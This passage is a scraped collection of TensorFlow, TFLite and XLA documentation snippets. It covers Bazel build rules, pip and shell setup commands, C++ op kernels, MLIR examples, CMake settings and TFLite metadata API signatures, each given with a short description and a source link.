DESCRIPTION: Shows how to install a specific nightly version of jaxlib using pip by appending the version string. This approach is useful for matching the jaxlib version precisely with the XLA commit your plugin is built against, especially before stable ABI compatibility is established.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_3

LANGUAGE: python
CODE:
```
pip install --pre -U jaxlib==0.4.2.dev20230103 -f https://storage.googleapis.com/jax-releases/jaxlib_nightly_releases.html
```

----------------------------------------

TITLE: Bazel Build Rules for TFLite Tools with Custom Delegate
DESCRIPTION: These Bazel `cc_binary` rules demonstrate how to create custom versions of standard TFLite tools (Benchmark Tool, Inference Diff, Image Classification, Object Detection) that are linked with the `dummy_delegate_provider` library, allowing them to use the custom delegate via command-line flags.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/implementing_delegate.md#_snippet_5

LANGUAGE: Bazel
CODE:
```
cc_binary(
    name = "benchmark_model_plus_dummy_delegate",
    copts = tflite_copts(),
    linkopts = task_linkopts(),
    deps = [
        ":dummy_delegate_provider",
        "//tensorflow/lite/tools/benchmark:benchmark_model_main",
    ],
)

cc_binary(
    name = "inference_diff_plus_dummy_delegate",
    copts = tflite_copts(),
    linkopts = task_linkopts(),
    deps = [
        ":dummy_delegate_provider",
        "//tensorflow/lite/tools/evaluation/tasks:task_executor_main",
        "//tensorflow/lite/tools/evaluation/tasks/inference_diff:run_eval_lib",
    ],
)

cc_binary(
    name = "imagenet_classification_eval_plus_dummy_delegate",
    copts = tflite_copts(),
    linkopts = task_linkopts(),
    deps = [
        ":dummy_delegate_provider",
        "//tensorflow/lite/tools/evaluation/tasks:task_executor_main",
        "//tensorflow/lite/tools/evaluation/tasks/imagenet_image_classification:run_eval_lib",
    ],
)

cc_binary(
    name = "coco_object_detection_eval_plus_dummy_delegate",
    copts = tflite_copts(),
    linkopts = task_linkopts(),
    deps = [
        ":dummy_delegate_provider",
        "//tensorflow/lite/tools/evaluation/tasks:task_executor_main",
        "//tensorflow/lite/tools/evaluation/tasks/coco_object_detection:run_eval_lib",
    ],
)
```

----------------------------------------

TITLE: Building TensorFlow Benchmark Tool for Android with Bazel
DESCRIPTION: This command builds the TensorFlow benchmark tool binary optimized for a specific Android architecture (armeabi-v7a) using Bazel. It requires configuring the Android NDK/SDK in the WORKSPACE file and uses the monolithic configuration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/benchmark/README.md#_snippet_0

LANGUAGE: Bash
CODE:
```
bazel build -c opt \
  --crosstool_top=//external:android/crosstool \
  --cpu=armeabi-v7a \
  --host_crosstool_top=@bazel_tools//tools/cpp:toolchain \
  --config monolithic \
  tensorflow/tools/benchmark:benchmark_model
```

----------------------------------------

TITLE: Binding XLA FFI Handler with Attribute Decoding
DESCRIPTION: Demonstrates creating an XLA FFI handler that automatically decodes specified MLIR attributes from `backend_config` (`i32` as `int32_t`, `str` as `std::string_view`) and passes them directly to the C++ callable.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_8

LANGUAGE: C++
CODE:
```
auto handler = Ffi::Bind()
  .Arg<BufferR0<F32>>()
  .Attr<int32_t>("i32")
  .Attr<std::string_view>("str")
  .To([](BufferR0<F32> buffer, int32_t i32, std::string_view str) {
    return Error::Success();
  });
```

----------------------------------------

TITLE: Setting Keras Backend to JAX Python
DESCRIPTION: This snippet sets the KERAS_BACKEND environment variable to 'jax'. This is a prerequisite for running Keras models using the JAX backend for computation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_0

LANGUAGE: python
CODE:
```
import os

os.environ["KERAS_BACKEND"] = "jax"
```

----------------------------------------

TITLE: Implementing Custom Multiplexer Kernel Logic in C++
DESCRIPTION: Implements the core computation for the `MultiplexDenseOp`. It defines a class derived from `OpKernel`, retrieves input tensors, performs shape validation, accesses tensor data using `flat<T>()`, allocates the output tensor, and computes the output values based on the boolean condition using a simple loop.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_5

LANGUAGE: c++
CODE:
```
template <typename T>
class MultiplexDenseOp : public OpKernel {
 public:
  explicit MultiplexDenseOp(OpKernelConstruction* ctx) : OpKernel(ctx) {}
  MultiplexDenseOp(const MultiplexDenseOp& other) = delete;
  MultiplexDenseOp& operator=(const MultiplexDenseOp& other) = delete;
  ~MultiplexDenseOp() override = default;

  void Compute(OpKernelContext* ctx) override {
    const auto& cond_tensor = ctx->input(0);
    const auto& a_values_tensor = ctx->input(1);
    const auto& b_values_tensor = ctx->input(2);

    // Allow any shape, but require that a_values, b_values, and cond all
    // have the same shape.
    // Note that ::tensorflow::TensorShapeUtils has some useful functions
    // for checking shapes.
    OP_REQUIRES(ctx, a_values_tensor.shape() == b_values_tensor.shape(),
                InvalidArgument(
                    "a_values and b_values must have the same shape. "
                    "a_values shape: ",
                    a_values_tensor.shape().DebugString(), " b_values shape: ",
                    b_values_tensor.shape().DebugString()));
    OP_REQUIRES(
        ctx, a_values_tensor.shape() == cond_tensor.shape(),
        InvalidArgument("a_values and cond must have the same shape. "
                        "a_values shape: ",
                        a_values_tensor.shape().DebugString(),
                        " cond shape: ", cond_tensor.shape().DebugString()));

    const auto a_values = a_values_tensor.flat<T>();
    const auto b_values = b_values_tensor.flat<T>();
    const auto cond = cond_tensor.flat<bool>();

    // Create an output tensor
    Tensor* output_tensor = nullptr;
    OP_REQUIRES_OK(
        ctx, ctx->allocate_output(0, a_values_tensor.shape(), &output_tensor));
    auto output = output_tensor->template flat<T>();
    const int64_t N = a_values_tensor.NumElements();

    // Here is an example of processing tensors in a simple loop directly
    // without relying on any libraries. For intensive math operations, it is
    // a good practice to use libraries such as Eigen that support
    // tensors when possible, e.g. "output = cond.select(a_values, b_values);"
    // Eigen supports chunking into blocks and multi-threading.
    // See
    // https://eigen.tuxfamily.org/dox/unsupported/eigen_tensors.html#title55
    for (int64_t i = 0; i < N; i++) {
      if (cond(i)) {
        output(i) = a_values(i);
      } else {
        output(i) = b_values(i);
      }
    }
  }
};
```

----------------------------------------

TITLE: Transforming Python For Loop with Break using AutoGraph
DESCRIPTION: Shows how a Python for loop that includes an early termination condition (like `break`) is transformed by AutoGraph. The `ag__.for_stmt` operator handles this by using an optional `extra_test` thunk evaluated on each iteration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_3

LANGUAGE: Python
CODE:
```
for i in range(3):
  if i > 2:
    break
  j = j + i
```

LANGUAGE: Python
CODE:
```
def get_state():
    return (j,)

def set_state(vars_):
    nonlocal j
    (j,) = vars_

def loop_body(itr):
    nonlocal j
    i = itr
    j = j + i

def extra_test():
    return not(i <= 2)

ag__.for_stmt(range(3), extra_test, loop_body, get_state, set_state, ('j',), {})
```

----------------------------------------

TITLE: Registering SimpleHashTableImport Op - TensorFlow C++
DESCRIPTION: Registers a TensorFlow custom operation named "Examples>SimpleHashTableImport". This op takes a resource handle, a tensor of keys, and a tensor of values as input, clearing the existing hash table in the resource and populating it with the provided key-value pairs. It requires `key_dtype` and `value_dtype` attributes which are used for the input tensor types. `SetShapeFn(ImportShapeFunction)` specifies the custom shape inference logic.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_8

LANGUAGE: C++
CODE:
```
REGISTER_OP("Examples>SimpleHashTableImport")
    .Input("table_handle: resource")
    .Input("keys: key_dtype")
    .Input("values: value_dtype")
    .Attr("key_dtype: type")
    .Attr("value_dtype: type")
    .SetShapeFn(ImportShapeFunction);
```

----------------------------------------

TITLE: Comparing ModelHParams Greater Than - Python
DESCRIPTION: Performs a greater than comparison between this `ModelHParams` instance and another object. This method is typically generated automatically by attribute libraries like `attrs` for ordered comparisons.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/spec/ModelHParams.md#_snippet_3

LANGUAGE: Python
CODE:
```
__gt__(
    other
)
```

----------------------------------------

TITLE: Check FeatureProperties Buffer Identifier in Python
DESCRIPTION: This class method checks if a given buffer contains the identifier for a `FeatureProperties` FlatBuffer. It is used to verify the type of data within a buffer before attempting to parse it.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeatureProperties.md#_snippet_0

LANGUAGE: python
CODE:
```
@classmethod
FeaturePropertiesBufferHasIdentifier(
    buf, offset, size_prefixed=False
)
```

----------------------------------------

TITLE: Setting TFCI to Disable Docker
DESCRIPTION: This command sets the `TFCI` environment variable to configure the environment for Python 3.11 on Linux x86_64 while explicitly disabling Docker usage. Docker is enabled by default on Linux, and this setting is used when a user prefers not to use the containerized build environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/ci/official/README.md#_snippet_2

LANGUAGE: bash
CODE:
```
export TFCI=py311,linux_x86,no_docker
```

----------------------------------------

TITLE: Initializing NormalizationOptionsT From Packed Buffer Python
DESCRIPTION: Initializes a `NormalizationOptionsT` object from a packed flatbuffer buffer (`buf`), optionally specifying a starting position (`pos`). This class method handles deserialization specifically from buffers that have been packed or compacted. It requires the packed buffer data and an optional offset.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/NormalizationOptionsT.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
InitFromPackedBuf(
    buf, pos=0
)
```

----------------------------------------

TITLE: Validate Detection Model Format - Shell
DESCRIPTION: Runs the `ovic_validator` binary built via Bazel to check the format of a TFLite detection model file. Replace `/path/to/my_model.lite` with the actual path to your model file. The second argument `detect` specifies the task type for validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_6

LANGUAGE: sh
CODE:
```
bazel-bin/tensorflow/lite/java/ovic/ovic_validator /path/to/my_model.lite detect
```

----------------------------------------

TITLE: Rewriting Non-Replicated Cluster Function MLIR
DESCRIPTION: This MLIR snippet shows the result of applying the `-tf-tpu-rewrite` pass to a non-replicated `tf_device.cluster_func`. It replaces the original operation with a sequence of `tf._TPUCompileMlir`, `tf.TPUCompileSucceededAssert`, and `tf.TPUExecute` ops wrapped in `tf_device.launch` operations for compilation and execution on the TPU.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_64

LANGUAGE: mlir
CODE:
```
func @tf_tpu_rewrite(%arg0: tensor<i8>) {
  %0:2 = "tf_device.launch"() ( {
    %compilation_status, %program = "tf._TPUCompileMlir"() {mlir_module = "<serialized func>"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
    tf_device.return %compilation_status, %program : tensor<!tf_type.string>, tensor<3x!tf_type.string>
  }) {device = "/job:worker/replica:0/task:0/device:CPU:0"} : () -> (tensor<!tf_type.string>, tensor<3x!tf_type.string>)
  "tf_device.launch"() ( {
    "tf.TPUCompileSucceededAssert"(%0#0) : (tensor<!tf_type.string>) -> ()
    tf_device.return
  }) {device = "/job:worker/replica:0/task:0/device:CPU:0"} : () -> ()
  %1 = "tf_device.launch"() ( {
    %2 = "tf.TPUExecute"(%arg0, %0#1) : (tensor<i8>, tensor<3x!tf_type.string>) -> tensor<i8>
    tf_device.return %2 : tensor<i8>
  }) {device = "/job:worker/replica:0/task:0/device:TPU:0"} : () -> tensor<i8>
  return
}
```

----------------------------------------

TITLE: Initializing ModelMetadata Object
DESCRIPTION: Initializes the ModelMetadata object with a buffer and position. This method is typically called internally after getting the root object from a buffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadata.md#_snippet_7

LANGUAGE: python
CODE:
```
Init(
    buf, pos
)
```

----------------------------------------

TITLE: Starting Associated Files Vector in TFLite Metadata Builder (Python)
DESCRIPTION: Initiates the creation of a vector (array) for associated files within the TFLite metadata FlatBuffers schema. It takes a FlatBuffers builder instance and the number of elements to reserve space for. This function must be called before adding individual associated file entries to the vector and should be followed by calls to add elements and end the vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/ModelMetadataStartAssociatedFilesVector.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.ModelMetadataStartAssociatedFilesVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Calling SubGraphMetadataAddDescription Function in Python
DESCRIPTION: This snippet shows the function signature for `SubGraphMetadataAddDescription`. It is a Python function used to associate a textual description with a `SubGraphMetadata` object within the TFLite metadata structure, typically when building metadata using a FlatBuffers builder.

Parameters:
- `builder`: The FlatBuffers builder instance.
- `description`: The string containing the description to add.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddDescription.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddDescription(
    builder, description
)
```

----------------------------------------

TITLE: Helper Function for Parsing Python Entity and Creating Context
DESCRIPTION: Defines a utility function `get_node_and_ctx` that takes a Python function object `f`. It uses `parser.parse_entity` to get the AST node and source code, then creates a `transformer.EntityInfo` and a `transformer.Context` object, which are often required for `pyct` analysis and transformation passes. This function simplifies setting up the environment for AST processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/pyct_tutorial.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
def get_node_and_ctx(f):
  node, source = parser.parse_entity(f, ())
  f_info = transformer.EntityInfo(
    name='f',
    source_code=source,
    source_file=None,
    future_features=(),
    namespace=None)
  ctx = transformer.Context(f_info, None, None)
  return node, ctx
```

----------------------------------------

TITLE: Executing Benchmark Script (Bash)
DESCRIPTION: This command runs the main `run.sh` script to perform the actual Gemma2 PyTorch benchmark. It requires the environment to be correctly set up beforehand, typically by running `setup.sh`. The script's output will include the benchmark results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/backends/cpu/benchmarks/e2e/gemma2/pytorch_2b/README.md#_snippet_1

LANGUAGE: bash
CODE:
```
bash run.sh
```

----------------------------------------

TITLE: Setup TensorFlow Lite Debugger Environment Python
DESCRIPTION: Uninstalls any existing TensorFlow installations, then installs the `tf-nightly` package which includes the experimental Quantization Debugger API. It also upgrades `tensorflow_datasets` to ensure compatibility with dataset loading.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_1

LANGUAGE: Shell
CODE:
```
!pip uninstall -y tensorflow
!pip install tf-nightly
!pip install tensorflow_datasets --upgrade  # imagenet_v2 needs latest checksum
```

----------------------------------------

TITLE: Defining Custom Bazel Rules for Selective TFLite (Bazel BUILD)
DESCRIPTION: This Bazel BUILD file snippet defines custom rules for creating selectively built TensorFlow Lite libraries for Android, C, and C++ using only built-in ops. It uses the `tflite_custom_android_library`, `tflite_custom_c_library`, and `tflite_custom_cc_library` macros, specifying a list of required models.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_2

LANGUAGE: bazel
CODE:
```
load(
    "@org_tensorflow//tensorflow/lite:build_def.bzl",
    "tflite_custom_android_library",
    "tflite_custom_c_library",
    "tflite_custom_cc_library",
)

# A selectively built TFLite Android library.
tflite_custom_android_library(
    name = "selectively_built_android_lib",
    models = [
        ":model_one.tflite",
        ":model_two.tflite",
    ],
)

# A selectively built TFLite C library.
tflite_custom_c_library(
    name = "selectively_built_c_lib",
    models = [
        ":model_one.tflite",
        ":model_two.tflite",
    ],
)

# A selectively built TFLite C++ library.
tflite_custom_cc_library(
    name = "selectively_built_cc_lib",
    models = [
        ":model_one.tflite",
        ":model_two.tflite",
    ],
)
```

----------------------------------------

TITLE: Building TF Lite C API for Android ARM (Shell)
DESCRIPTION: This command uses Bazel to build the optimized TensorFlow Lite C API library (`tensorflowlite_c`) specifically configured for Android ARM architecture. The `--config=android_arm` flag specifies the target platform configuration. It mentions replacing `android_arm` with `android_arm64` for 64-bit builds.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/experimental/examples/unity/TensorFlowLitePlugin/README.md#_snippet_1

LANGUAGE: sh
CODE:
```
bazel build -c opt --config=android_arm //tensorflow/lite/c:tensorflowlite_c

```

----------------------------------------

TITLE: Building TFLite AAR with Docker - Shell
DESCRIPTION: This shell command executes the `build_aar_with_docker.sh` script within the Docker environment to build custom TensorFlow Lite AAR files. It requires specifying input model file paths and target Android architectures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/reduce_binary_size.md#_snippet_15

LANGUAGE: Shell
CODE:
```
sh build_aar_with_docker.sh \
  --input_models=/a/b/model_one.tflite,/c/d/model_two.tflite \
  --target_archs=x86,x86_64,arm64-v8a,armeabi-v7a \
  --checkpoint=master \
  [--cache_dir=<path to cache directory>]
```

----------------------------------------

TITLE: Starting InputProcessUnits Vector in SubGraph Metadata (Python)
DESCRIPTION: This function is used during the FlatBuffers building process to start a vector within the `SubGraphMetadata` table that will contain `InputProcessUnit` elements. It prepares the builder to accept a specified number of elements for this vector.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataStartInputProcessUnitsVector.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataStartInputProcessUnitsVector(
    builder, numElems
)
```

----------------------------------------

TITLE: Implementing GetPjrtApi C++
DESCRIPTION: Shows how to implement the `GetPjrtApi` function in C++ to return a `PJRT_Api` struct containing function pointers to the PJRT C API implementations. This example uses the wrapper's `pjrt::CreatePjrtApi` function, linking it to the `PJRT_Client_Create` implementation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/pjrt/pjrt_integration.md#_snippet_1

LANGUAGE: C++
CODE:
```
const PJRT_Api* GetPjrtApi() {
  static const PJRT_Api pjrt_api =
      pjrt::CreatePjrtApi(my_plugin::PJRT_Client_Create);
  return &pjrt_api;
}
```

----------------------------------------

TITLE: Generating RunMetadata for TensorFlow Profiling (Python)
DESCRIPTION: Provides the necessary code snippet to generate `tf.RunMetadata` by running a TensorFlow session (`sess.run`) with `tf.RunOptions(trace_level=tf.RunOptions.FULL_TRACE)`. This metadata contains essential timing and memory information required for time and memory profiling.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/python_api.md#_snippet_3

LANGUAGE: python
CODE:
```
# Generate the RunMetadata that contains the memory and timing information.
#
# Note: When run on accelerator (e.g. GPU), an operation might perform some
#       cpu computation, enqueue the accelerator computation. The accelerator
#       computation is then run asynchronously. The profiler considers 3
#       times: 1) accelerator computation. 2) cpu computation (might wait on
#       accelerator). 3) the sum of 1 and 2.
#
run_metadata = tf.RunMetadata()
with tf.Session() as sess:
  _ = sess.run(train_op,
               options=tf.RunOptions(trace_level=tf.RunOptions.FULL_TRACE),
               run_metadata=run_metadata)
```

----------------------------------------

TITLE: Running TFLite Buffer Reconstitution Tool (Shell)
DESCRIPTION: This command executes the `reconstitute_buffers_into_fb` tool via Bazel. It takes a lean TFLite flatbuffer (stripped model) and fills in the emptied buffers with random data, reconstituting the model in memory for further processing or benchmarking. Requires paths for the input stripped flatbuffer and the output reconstituted flatbuffer.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/strip_buffers/README.md#_snippet_1

LANGUAGE: Shell
CODE:
```
bazel run -c opt tensorflow/lite/tools/strip_buffers:reconstitute_buffers_into_fb -- --input_flatbuffer=/input/path.tflite --output_flatbuffer=/output/path.tflite
```

----------------------------------------

TITLE: Including TSL and XLA Directories
DESCRIPTION: Adds the `TSL_SOURCE_DIR` and `XLA_SOURCE_DIR` to the include directories for the build. These directories contain necessary headers from TensorFlow's third-party dependencies.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_14

LANGUAGE: CMake
CODE:
```
# Include TSL, which is in tensorflow/third_party
include_directories(
  ${TSL_SOURCE_DIR}
  ${XLA_SOURCE_DIR}
)
```

----------------------------------------

TITLE: Creating Metadata Writer from Flatbuffers (TFLite Support, Python)
DESCRIPTION: Initializes a MetadataWriter using existing metadata represented as Flatbuffers Python objects. It requires the model buffer and accepts optional parameters for general model metadata, input/output tensor metadata, associated files, and process unit metadata. This method allows constructing the writer from pre-parsed or partially constructed metadata structures.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/bert_nl_classifier/MetadataWriter.md#_snippet_2

LANGUAGE: python
CODE:
```
@classmethod
create_from_metadata(
    model_buffer: bytearray,
    model_metadata: Optional[<a href="../../../tflite_support/metadata_schema_py_generated/ModelMetadataT"><code>tflite_support.metadata_schema_py_generated.ModelMetadataT</code></a>] = None,
    input_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    output_metadata: Optional[List[_metadata_fb.TensorMetadataT]] = None,
    associated_files: Optional[List[str]] = None,
    input_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None,
    output_process_units: Optional[List[_metadata_fb.ProcessUnitT]] = None
)
```

----------------------------------------

TITLE: Getting Input Tensor Metadata Count in Python
DESCRIPTION: Retrieves the number of entries in the input tensor metadata list. This method returns the size of the input tensor metadata array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_18

LANGUAGE: python
CODE:
```
InputTensorMetadataLength()
```

----------------------------------------

TITLE: Defining Source Directory Variables
DESCRIPTION: This code defines several variables (`TENSORFLOW_SOURCE_DIR`, `TF_SOURCE_DIR`, `TSL_SOURCE_DIR`, `XLA_SOURCE_DIR`, `TFLITE_SOURCE_DIR`) pointing to key directories within the TensorFlow source tree. It attempts to locate the main TensorFlow source directory relative to the current CMake file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
set(TENSORFLOW_SOURCE_DIR "" CACHE PATH
  "Directory that contains the TensorFlow project"
)
if(NOT TENSORFLOW_SOURCE_DIR)
  get_filename_component(TENSORFLOW_SOURCE_DIR
    "${CMAKE_CURRENT_LIST_DIR}/../../"
    ABSOLUTE
  )
endif()
set(TF_SOURCE_DIR "${TENSORFLOW_SOURCE_DIR}/tensorflow")
set(TSL_SOURCE_DIR "${TENSORFLOW_SOURCE_DIR}/third_party/xla/third_party/tsl")
set(XLA_SOURCE_DIR "${TENSORFLOW_SOURCE_DIR}/third_party/xla/")
set(TFLITE_SOURCE_DIR "${CMAKE_CURRENT_LIST_DIR}")
```

----------------------------------------

TITLE: Setting C++ Standard - CMake
DESCRIPTION: Specifies that the C++ language standard should be set to C++20 for the project. This affects how C++ source files are compiled.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/c/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
set(CMAKE_CXX_STANDARD 20)
```

----------------------------------------

TITLE: Compiling TF-TRT and Building Pip Package using Bazel (Shell)
DESCRIPTION: This command sequence compiles TensorFlow, including the TF-TRT module, using Bazel with CUDA and optimization configurations enabled. It then executes the build script to generate a Python pip package (.whl file) containing the compiled TensorFlow and TF-TRT, placing the resulting package in the specified temporary directory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/compiler/tensorrt/README.md#_snippet_0

LANGUAGE: shell
CODE:
```
bazel build --config=cuda --config=opt //tensorflow/tools/pip_package:build_pip_package
bazel-bin/tensorflow/tools/pip_package/build_pip_package /tmp/
```

----------------------------------------

TITLE: Extract OVIC Test Data Archive - Shell
DESCRIPTION: Extracts the contents of the downloaded OVIC test data archive (`/tmp/ovic.zip`) into the specified TensorFlow Lite testdata directory using `unzip`, flattening the directory structure (`-j`). Assumes the command is run from the TensorFlow installation root.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/java/ovic/README.md#_snippet_1

LANGUAGE: sh
CODE:
```
unzip -j /tmp/ovic.zip -d tensorflow/lite/java/ovic/src/testdata/
```

----------------------------------------

TITLE: Demonstrating Illegal Shape Change in AutoGraph while Loop Python
DESCRIPTION: Illustrates the same shape consistency restriction as `tf.while_loop`, but applied to a standard Python `while` loop automatically converted by AutoGraph. Assigning a tensor with a different shape to a loop variable (`x`) results in an error.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_44

LANGUAGE: Python
CODE:
```
x = tf.constant(1,)
while tf.random.uniform(()) > 0.5:
  x = tf.constant((1, 2, 3))  # Error -- inconsistent shapes: (), (3,)
```

----------------------------------------

TITLE: Creating MetadataPopulator from Model Buffer - Python
DESCRIPTION: This class method creates a MetadataPopulator instance designed to work with a TensorFlow Lite model provided as a byte buffer. It's the entry point for adding or modifying metadata and associated files for a model held in memory. It raises a ValueError if the model buffer does not have the expected flatbuffer identifier.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_12

LANGUAGE: Python
CODE:
```
@classmethod
with_model_buffer(
    model_buf
)
```

----------------------------------------

TITLE: Combining Default and Custom CUDA/CUDNN/NCCL Configurations (Bazel)
DESCRIPTION: This comprehensive Bazel snippet demonstrates how to combine default hermetic configurations with custom settings. It shows loading default values, defining custom JSON and distribution dictionaries, initializing repositories by merging default JSON/dictionaries with custom ones, and initializing NCCL wheels similarly.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/hermetic_cuda.md#_snippet_14

LANGUAGE: Bazel
CODE:
```
load(
    "//third_party/gpus/cuda/hermetic:cuda_redist_versions.bzl",
    "CUDA_REDIST_PATH_PREFIX",
    "CUDA_NCCL_WHEELS",
    "CUDA_REDIST_JSON_DICT",
    "CUDNN_REDIST_PATH_PREFIX",
    "CUDNN_REDIST_JSON_DICT",
)

_CUDA_JSON_DICT = {
   "12.4.0": [
      "file:///usr/Downloads/redistrib_12.4.0_updated.json",
   ],
}

_CUDNN_JSON_DICT = {
   "9.0.0": [
      "https://developer.download.nvidia.com/compute/cudnn/redist/redistrib_9.0.0.json",
   ],
}

cuda_json_init_repository(
   cuda_json_dict = CUDA_REDIST_JSON_DICT | _CUDA_JSON_DICT,
   cudnn_json_dict = CUDNN_REDIST_JSON_DICT | _CUDNN_JSON_DICT,
)

load(
   "@cuda_redist_json//:distributions.bzl",
   "CUDA_REDISTRIBUTIONS",
   "CUDNN_REDISTRIBUTIONS",
)

load(
   "//third_party/gpus/cuda/hermetic:cuda_redist_init_repositories.bzl",
   "cuda_redist_init_repositories",
   "cudnn_redist_init_repository",
)

_CUDA_DIST_DICT = {
   "cuda_cccl": {
      "linux-x86_64": {
            "relative_path": "cuda_cccl-linux-x86_64-12.4.99-archive.tar.xz",
      },
      "linux-sbsa": {
            "relative_path": "cuda_cccl-linux-sbsa-12.4.99-archive.tar.xz",
      },
   },
   "libcusolver": {
      "linux-x86_64": {
            "full_path": "file:///usr/Downloads/dists/libcusolver-linux-x86_64-11.6.0.99-archive.tar.xz",
      },
      "linux-sbsa": {
         "relative_path": "libcusolver-linux-sbsa-11.6.0.99-archive.tar.xz",
      },
   },
}

_CUDNN_DIST_DICT = {
   "cudnn": {
      "linux-x86_64": {
            "cuda12": {
               "relative_path": "cudnn-linux-x86_64-9.0.0.312_cuda12-archive.tar.xz",
            },
      },
      "linux-sbsa": {
            "cuda12": {
               "relative_path": "cudnn-linux-sbsa-9.0.0.312_cuda12-archive.tar.xz",
            },
      },
   },
}

cudnn_redist_init_repositories(
   cuda_redistributions = CUDA_REDISTRIBUTIONS | _CUDA_DIST_DICT,
   cuda_redist_path_prefix = "file:///usr/Downloads/dists/",
)

cudnn_redist_init_repository(
   cudnn_redistributions = CUDNN_REDISTRIBUTIONS | _CUDNN_DIST_DICT,
   cudnn_redist_path_prefix = "file:///usr/Downloads/dists/cudnn/"
)

load(
    "//third_party/nccl/hermetic:nccl_redist_init_repository.bzl",
    "nccl_redist_init_repository",
)

_NCCL_WHEEL_DICT = {
   "12.4.0": {
      "x86_64-unknown-linux-gnu": {
            "url": "https://files.pythonhosted.org/packages/38/00/d0d4e48aef772ad5aebcf70b73028f88db6e5640b36c38e90445b7a57c45/nvidia_nccl_cu12-2.19.3-py3-none-manylinux1_x86_64.whl",
      },
   },
}

nccl_redist_init_repository(
   cuda_nccl_wheels = CUDA_NCCL_WHEELS | _NCCL_WHEEL_DICT,
)
```

----------------------------------------

TITLE: Lowering tfl.concatenation to TOSA MLIR
DESCRIPTION: Documents the lowering of the TensorFlow Lite `tfl.concatenation` operation, which concatenates tensors along a dimension, to the TOSA dialect's `lower_concatv2_op`. It uses the `axis` attribute.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/tosa/g3doc/legalization.md#_snippet_59

LANGUAGE: MLIR
CODE:
```
%output = tfl.concatenation(%values) {axis}
```

LANGUAGE: MLIR
CODE:
```
%result = lower_concatv2_op(%values, axis)
```

----------------------------------------

TITLE: Building XLA for GPU/CUDA in Docker (Shell)
